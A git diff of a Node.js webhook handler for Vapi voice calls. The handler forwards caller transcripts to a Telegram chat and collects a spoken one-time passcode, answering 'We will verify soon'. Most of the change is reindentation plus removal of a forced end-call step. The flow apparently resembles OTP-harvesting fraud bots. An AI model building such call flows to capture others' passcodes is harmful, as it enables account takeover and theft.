@@ -172,23 +172,23 @@ module.exports = async function handler(req, res) {
   }
 
   // ===== VAPI TRANSCRIPT HANDLER =====
-if (body?.message?.type === "transcript") {
-  const text = body.message.text?.trim();
-  const phone = body.message.call?.customer?.number;
+  if (body?.message?.type === "transcript") {
+    const text = body.message.text?.trim();
+    const phone = body.message.call?.customer?.number;
 
-  if (!text) return res.status(200).send("OK");
+    if (!text) return res.status(200).send("OK");
 
-  const user = phone ? await User.findOne({ phone }) : null;
+    const user = phone ? await User.findOne({ phone }) : null;
 
-  if (user?.chatId) {
-    await bot.sendMessage(
-      user.chatId,
-      `🗣 User said: ${text}`
-    );
+    if (user?.chatId) {
+      await bot.sendMessage(
+        user.chatId,
+        `🗣 User said: ${text}`
+      );
+    }
+
+    return res.status(200).send("OK");
   }
-
-  return res.status(200).send("OK");
-}
 
   // ===== VAPI TOOL CALL HANDLER (OTP) =====
   if (body?.message?.type === "tool-calls") {
@@ -198,7 +198,7 @@ if (body?.message?.type === "transcript") {
     const toolCallId = toolCall.id;
 
     let enteredOtp = toolCall.function?.arguments?.otp || "";
-    enteredOtp = enteredOtp.replace(/[^0-9]/g, ""); // remove #
+    enteredOtp = enteredOtp.replace(/[^0-9]/g, "");
 
     const phone = body.message.call?.customer?.number;
     const user = phone ? await User.findOne({ phone }) : null;
@@ -210,21 +210,15 @@ if (body?.message?.type === "transcript") {
       );
     }
 
-    // Force end call reliably
-const controlUrl = body.message.call?.monitor?.controlUrl;
-
-if (controlUrl) {
-  await axios.post(controlUrl, { type: "end-call" });
-}
-
-return res.status(200).json({
-  results: [
-    {
-      toolCallId,
-      result: "Thank you. We will verify soon."
-    }
-  ]
-});
+    return res.status(200).json({
+      results: [
+        {
+          toolCallId,
+          result: "Thank you. We will verify soon."
+        }
+      ]
+    });
+  }
 
   // ✅ FALLBACK RESPONSE
   return res.status(200).send("OK");
